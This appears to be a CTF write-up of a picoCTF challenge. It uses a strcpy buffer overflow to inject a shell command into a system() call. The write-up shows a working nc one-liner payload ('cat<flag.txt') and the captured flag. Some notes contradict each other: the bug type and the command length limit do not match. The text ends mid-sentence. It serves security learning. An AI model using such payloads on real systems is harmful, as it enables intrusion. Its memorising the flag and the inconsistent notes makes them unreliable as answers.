# Input Injection 1

**Category:** binary exploitation
**Difficulty:** Medium  
**Progress:** Solved

---

## Description

A friendly program wants to greet you… but its goodbye might say more than it should. Can you convince it to reveal the flag?

**Files:** `vuln (binary)`, `vuln.c`



---

## Analysis + Info Dump

#### file + checksec (+ readelf)
```

Arch:     ELF 64-bit LSB executable, x86-64
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE
RPATH:    No RPATH
RUNPATH:  No RUNPATH
FORTIFY:  NO (Fortified 0 / Fortifiable 3)
SYMBOLS:  72 (not stripped)

```



#### Info Dump
```
looks like vulnerability is in fun(char *name, char *cmd)
name override buffer[10] and cmd overrides c[10] both with strcpy and no check for size of input. name is originally an input coming from main 
```


### Vulnerability
- Heap-based Buffer Overflow

<!--
### Stack Layout
```
┌──────────────────┐
│  buf[0..31]      │  +0
├──────────────────┤
│  padding         │  +32
├──────────────────┤
│  saved EBX       │  +36
├──────────────────┤
│  saved EBP       │  +40
├──────────────────┤
│  return address  │  +44
└──────────────────┘
```
return adress -> push ebp -> push ebx -> sub 0x24 (36<sub>10</sub>)
padding = 0x24 - 0x20 = 0x04 

---
-->
## Solution


### Step 1:

```
Both buffers are of length 10.
If we input something of length 20 we override both of them (buffer and c) and if c is overriden it is given to system. There is no jump or anything in assembly so after overriding hte buffer the system() command will be executed.
So we override the first 10 bytes and then place our command. Gotta keep in mind our command can maximal 10 bytes long.
```
### Step 2 — Exploit
```
python3 -c "import sys; sys.stdout.buffer.write(b'A'*10 + b'cat<flag.txt'+ b'\n')" | nc amiable-citadel.picoctf.net 49957

```

### Step 3 — Capturing the flag

```
picoCTF{0v3rfl0w_c0mm4nd_a9259e7a}
```


<!--
---
## Exploit

```python

```
-->

---

## Learnings

- `cat<flag.txt` is an awesome way to circumvent space-problems for input (still)
- sometimes the buffer overflows are pretty simple. I mean just 10 bytes and 
